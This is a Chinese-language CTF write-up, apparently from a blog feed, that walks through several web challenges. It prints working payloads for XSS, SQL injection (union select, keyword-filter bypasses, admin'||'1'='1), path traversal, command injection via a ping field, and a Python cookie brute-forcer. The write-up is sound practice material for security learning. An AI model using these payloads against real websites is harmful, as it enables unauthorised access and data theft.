-<h3 id="简单的JS"><a href="#简单的JS" class="headerlink" title="简单的JS"></a>简单的JS</h3><h4 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h4><p>简单的JS<br>描述：执行后的结果就是flag 的url<br><a href="http://218.76.35.75:20123/" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开解题链接</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%878.png" alt=""></p>
-<p>还有一个明显提示 evilurl is flag </p>
-<p>看不出什么其他的，直接查看源码</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%879.png" alt=""></p>
-<p>在这里可以看到定义一个p，eval以后写到页面，但是好像并没有输出什么，猜测可能这里没有执行成功，JS 问题可以直接查看控制台</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8710.png" alt=""></p>
-<p>可以看到报语法错误，</p>
-<p>我们把这个语句copy下来，自己调试好</p>
-<p>没修改之前，明显的有报错</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8711.png" alt=""></p>
-<p>我们把它第二行的空格和第一行的换行符删掉，然后执行eval，看下P 到底是什么</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8712.png" alt=""></p>
-<p>题目提示执行后的结果就是flag的url</p>
-<p>访问这个url试试</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8713.png" alt=""></p>
-<p>页面没有输出什么，再抓包看看</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8714.png" alt=""></p>
-<p>可以看到flag已经写在cookie里了。</p>
-<h4 id="Flag-7"><a href="#Flag-7" class="headerlink" title="Flag"></a>Flag</h4><p>flag{COOk1els60SecU5e}</p>
-<h3 id="试试xss"><a href="#试试xss" class="headerlink" title="试试xss"></a>试试xss</h3><h4 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h4><p>描述：alert document.domain</p>
-<p><a href="http://218.76.35.75:20125/" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开就一个输入框，输入字母啥的没啥反应。。。。</p>
-<p>被谁吃了。。。</p>
-<p>既然提示xss，就试试特殊符号吧，比如“&lt;&gt;”</p>
-<p>加个’的时候，多了一个img标签，什么鬼。。。。。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8715.png" alt=""></p>
-<p>当我输入’aaaaaaaaaaaa的时候。。。。</p>
-<p>aaaaaaaaaaaa居然直接成了img的一个属性名，可怕。。。。</p>
-<p>这样就简单了，瞬间就想到onerror，既然hint 是alertdocument.domain，那就用这个吧</p>
-<p>直接’ onerror=alert(document.domain)这样不就可以了，试试先。。。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8716.png" alt=""></p>
-<p>居然没弹出来。。。。</p>
-<p>为什么！！！！！</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png" alt=""></p>
-<p>查看下源码。。。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8718.png" alt=""></p>
-<p>至少知道了我们输入的内容并没有被实体编码。。。</p>
-<p>但是onerror事件没有发生，就说明img标签的src并没有出错。。。</p>
-<p>再看看刚才我们输入的内容</p>
-<p>onerror=alert(document.domain)</p>
-<p>如果在’前面加一个不存在的路径，那后面的onerror事件不就可以出发了么。。。</p>
-<p>试试再说。。。。</p>
-<p>输入heetian.jpg’ onerror=alert(document.domain)</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8719.png" alt=""></p>
-<p>终于出来了。。。</p>
-<h4 id="Flag-8"><a href="#Flag-8" class="headerlink" title="Flag"></a>Flag</h4><p>flag{D0Gum6Ntd0M11n}</p>
-<h3 id="简单的文件包含"><a href="#简单的文件包含" class="headerlink" title="简单的文件包含"></a>简单的文件包含</h3><h4 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h4><p>简单的文件包含<br>描述：Flag 在/flag<br><a href="http://218.76.35.75:20126/" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开解题链接，可以看到4个超链接，然后就没有然后了。。。</p>
-<p>一个一个访问看看。。。。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8720.png" alt=""></p>
-<p>考过3级（没考过）的渣渣表示看不懂</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8721.png" alt=""></p>
-<p>其他链接也是如此，就只有一句英文的名言(看起来似乎是名言… 我也不知道是不是，知道的告诉我下…，先谢谢了…)。。。。</p>
-<p>抓包也没看到什么可疑的东西</p>
-<p>再看看题目提示吧，没准就有就用。。。</p>
-<p>标题是文件包含，也说了flag的位置。。。</p>
-<p>再回来看看前面的4个超链接</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8722.png" alt=""></p>
-<p>这种url形式的，看起来有点像是文件包含，直接修改page值为/flag 看看</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8723.png" alt=""></p>
-<p>居然不在这里。。。提示又说在/flag ，可以试试多加几个../../../../../试试~~~~</p>
-<p>不过在这之前还是先查看源码和响应包吧….</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8724.png" alt=""></p>
-<p>有注释。。。</p>
-<p>访问这个页面。。。得到flag。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8725.png" alt=""></p>
-<h4 id="Flag-9"><a href="#Flag-9" class="headerlink" title="Flag"></a>Flag</h4><p>flag{F11elNcLud3Get}</p>
-<h3 id="简单的验证"><a href="#简单的验证" class="headerlink" title="简单的验证"></a>简单的验证</h3><h4 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h4><p>简单的验证<br>描述：你不是amdin，没有权限查看flag<br><a href="http://218.76.35.75:20127" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><p>和题目5差不多，把cookie里面user改成admin之后，爆破guess值，最后是573<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">r=requests.session()</div><div class="line"></div><div class="line">url=&quot;http://218.76.35.75:20127/index.php&quot;</div><div class="line">for i in xrange(1000,0,-1):</div><div class="line"></div><div class="line">    header=&#123;&quot;Cookie&quot;:&quot;user=admin;guess=&quot;+str(i)&#125;</div><div class="line"></div><div class="line">    print header</div><div class="line"></div><div class="line">    result=r.get(url,headers=header)</div><div class="line"></div><div class="line">    content=result.content</div><div class="line"></div><div class="line">    if &apos;flag&apos; in content or &apos;Flag&apos; in content or &apos;FLAG&apos; in content:</div><div class="line"></div><div class="line">        print content</div><div class="line"></div><div class="line">        print i</div><div class="line"></div><div class="line">        break</div></pre></td></tr></table></figure></p>
-<p>运行结果<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8726.png" alt=""></p>
-<h4 id="Flag-10"><a href="#Flag-10" class="headerlink" title="Flag"></a>Flag</h4><p>flag{EaSy70Ch1ngG00kie}</p>
-<h3 id="注入那么简单"><a href="#注入那么简单" class="headerlink" title="注入那么简单"></a>注入那么简单</h3><h4 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h4><p>注入那么简单<br>描述：注入、猜表、拿分，就是这么简单<br><a href="http://218.76.35.75:20101" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目要求是注入，可输入的参数为name </p>
-<p>首先尝试name=guest 存在返回。</p>
-<p>再次尝试name=guest’or’1’=’1,返回3列，说明没有做过多的过滤，这里，我们尝试用order by 来获得列。</p>
-<p>Name=guest’order by 1 %23 有返回，依次递增数字到4时报错，说明有3列。</p>
-<p>题目提示，说要猜表，构造如下语句，来获得flag</p>
-<p><a href="http://218.76.35.75:20101/?name=guest%27union%20select%201,flag,3%20from%20flag%23" target="_blank" rel="external">http://218.76.35.75:20101/?name=guest%27union%20select%201,flag,3%20from%20flag%23</a></p>
-<h4 id="Flag-11"><a href="#Flag-11" class="headerlink" title="Flag"></a>Flag</h4><p>flag{thisisforunionsqlinjection}</p>
-<h3 id="你能进来么"><a href="#你能进来么" class="headerlink" title="你能进来么"></a>你能进来么</h3><h4 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h4><p>你能进来么<br>描述：图片上传功能真的好强大<br><a href="http://218.76.35.75:20103" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h4><p>上传一个图片马直接拿到flag</p>
-<h4 id="Flag-12"><a href="#Flag-12" class="headerlink" title="Flag"></a>Flag</h4><p>flag{uploadwithinclude}</p>
-<h3 id="好简单的题目"><a href="#好简单的题目" class="headerlink" title="好简单的题目"></a>好简单的题目</h3><h4 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h4><p>好简单的题目<br>描述：我要dir溢出你，信不信<br><a href="http://218.76.35.75:20105" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h4><p>这个题目，原本就是一个不可能的命题，谁都不可能dir命令能溢出服务器，猜测出题者考察命令执行，并且，页面上也为目标Ip的输入，我们输入127.0.0.1 返回Ping的结果</p>
-<p>猜测，目标IP后面可以加上连接符，执行多条语句。</p>
-<p>这里有个小小的障碍，linux下的连接符有多个。如&amp;&amp;,||,;,| 我们需要都测试后面命令为简单的ls 即可</p>
-<p>127.0.0.1111|ls</p>
-<p>可以看到有md5字符串返回。猜测为文件夹。<br><a href="http://218.76.35.75:20105/3f83e03a1e4e65573ef11cca25048808/" target="_blank" rel="external">http://218.76.35.75:20105/3f83e03a1e4e65573ef11cca25048808/</a><br>访问即可获得flag</p>
-<h4 id="Flag-13"><a href="#Flag-13" class="headerlink" title="Flag"></a>Flag</h4><p>flag{dirpwnitdoyouknow}</p>
-<h3 id="没那么简单"><a href="#没那么简单" class="headerlink" title="没那么简单"></a>没那么简单</h3><h4 id="题目-14"><a href="#题目-14" class="headerlink" title="题目"></a>题目</h4><p>没那么简单<br>（50位解决者）<br>描述：我认为这是一个sql注入，你发现了吗<br><a href="http://218.76.35.75:20108" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h4><p>发现存在robots.txt 文件</p>
-<p>访问该地址。得到upload.zip</p>
-<p>Upload.zip为index.php</p>
-<p>查看Index.php后。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8727.png" alt=""></p>
-<p>发现对大多数的字符进行了过滤。该过滤方式为黑名单判断，我们只需要找到程序中，为过滤完全的字符，进行payload编写即可。</p>
-<p>查找wooyun或者其他地方的资料库，可以知道.%0a 同样可以用来做空格的代替。</p>
-<p>那么我们只需要构造如下参数提交</p>
-<p>username=admind’%a0union%a0select%a0’4124bc0a9335c27f086f24ba207a4912’%a0from%a0admin%a0where%a0’1’=’1&amp;password=aa<br>即可得到flag</p>
-<h4 id="Flag-14"><a href="#Flag-14" class="headerlink" title="Flag"></a>Flag</h4><p>flag{robotsfilehassomehappything}</p>
-<h3 id="有趣的注入"><a href="#有趣的注入" class="headerlink" title="有趣的注入"></a>有趣的注入</h3><h4 id="题目-15"><a href="#题目-15" class="headerlink" title="题目"></a>题目</h4><p>有趣的注入<br>描述：在渗透测试中，任何细节都不能错过。sql注入是渗透测试中最常使用的攻击技术。这里有一个简单的网站，请帮忙找到flag。<br><a href="http://218.76.35.75:20116" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h4><p>1.文件包含（需要开一下脑洞，猜一猜文件名）</p>
-<p>根据提示，可以得到一个目录：</p>
-<p><a href="http://218.76.35.75:20116/flagishere/" target="_blank" rel="external">http://218.76.35.75:20116/flagishere/</a><br>2.访问这个目录，是一个登录界面，这道题目考的是注入，只不过考点是sql注入的绕过。后端代码中检测了并且拦截了各种sql的关键字。</p>
-<p>但是，可以使用“||”来代替关键词 OR</p>
-<p>用户名和密码输入admin’||’1’=’1即可绕过检测登录，获得flag</p>
-<h4 id="Flag-15"><a href="#Flag-15" class="headerlink" title="Flag"></a>Flag</h4><p>flag{s0_e4sy<em>sq1i</em>:)}</p>
-<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这次CTF的Writeup，有的解题思路是题目给出的，一部分是自己的想法。自己的水平还是有些不够吧！这里只写了一些题目的Writeup，有的题目的链接已经失效了。<br>有的题目是真的不知道做，思路也看不大懂。就这样吧，后面如果可以的话，再更新吧！</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
     
     
   </entry>
